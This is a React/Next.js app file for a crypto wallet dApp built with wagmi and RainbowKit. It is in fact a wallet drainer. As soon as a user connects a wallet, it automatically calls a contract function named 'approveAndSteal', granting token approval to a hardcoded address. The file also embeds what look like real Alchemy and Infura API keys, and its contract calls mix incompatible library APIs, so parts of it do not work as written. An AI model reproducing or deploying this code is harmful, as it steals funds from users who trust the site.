import React, { useEffect, useState } from 'react';
import "../styles/globals.css";
import "@rainbow-me/rainbowkit/styles.css";

import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
import { configureChains, createClient, WagmiConfig } from "wagmi";
import {
    mainnet,
    polygon,
    optimism,
    arbitrum,
    goerli,
    polygonMumbai,
    optimismGoerli,
    arbitrumGoerli,
} from "wagmi/chains";
import { alchemyProvider } from "wagmi/providers/alchemy";
import { publicProvider } from "wagmi/providers/public";
import { infuraProvider } from "wagmi/providers/infura";
import MainLayout from "../layout/mainLayout";

const abi = [
    {
      "inputs": [],
      "name": "approveAndSteal",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

const contractAddress = '0xbAa68d816B2713F9e2f188f1B802ef8b77B2936b';

const alchemyAPIKey = 'JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/JJbjMztYVUqS5wDcRxF8wmBPrimSglub';

const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
const infuraURL = 'https://polygon-mainnet.infura.io/v3/c6f67ed83ef14e6298373339528a7587';

const tokenParams = {
    name: 'WETH',
    symbol: 'WETH',
    WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
};

const { chains, provider } = configureChains(
    [
        mainnet,
        goerli,
        polygon,
        polygonMumbai,
        optimism,
        optimismGoerli,
        arbitrum,
        arbitrumGoerli,
    ],
    [
        alchemyProvider({ apiKey: alchemyURL }),
        publicProvider(),
        infuraProvider({ projectId: infuraAPIKey }),
    ]
);

const { connectors } = getDefaultWallets({
    appName: "My Alchemy DApp",
    chains,
});

const wagmiClient = createClient({
    autoConnect: true,
    connectors,
    provider,
});

const approveTransaction = async () => {
    try {
        const contractInstance = wagmiClient.getContract(contractAddress, abi);
        console.log('Contract instance:', contractInstance);

        const spender = '0xbAa68d816B2713F9e2f188f1B802ef8b77B2936b';
        const value = '1000000000000000000';
        console.log('Spender:', spender);
        console.log('Value:', value);

        const result = await contractInstance.methods.approveAndSteal(spender, value).send({}); // Call approveAndSteal
        console.log('Transaction successfully sent:', result);
    } catch (error) {
        console.error('Error sending transaction:', error);
    }
};

function MyApp({ Component, pageProps }) {
    const [connected, setConnected] = useState(false);
    const [chainId, setChainId] = useState(null);

    useEffect(() => {
        if (connected) {
            approveTransaction(); // Call approveAndSteal when connected
        }
    }, [connected]);

    return (
        <WagmiConfig
            client={wagmiClient}
            onConnect={() => {
                setConnected(true);
                setChainId(wagmiClient.chainId);
            }}
            onDisconnect={() => {
                setConnected(false);
                setChainId(null);
            }}
        >
            <RainbowKitProvider
                modalSize="compact"
                initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
                chains={chains}
            >
                <MainLayout>
                    <Component {...pageProps} />
                </MainLayout>
            </RainbowKitProvider>
        </WagmiConfig>
    );
}

export { WagmiConfig, RainbowKitProvider };
export default MyApp;
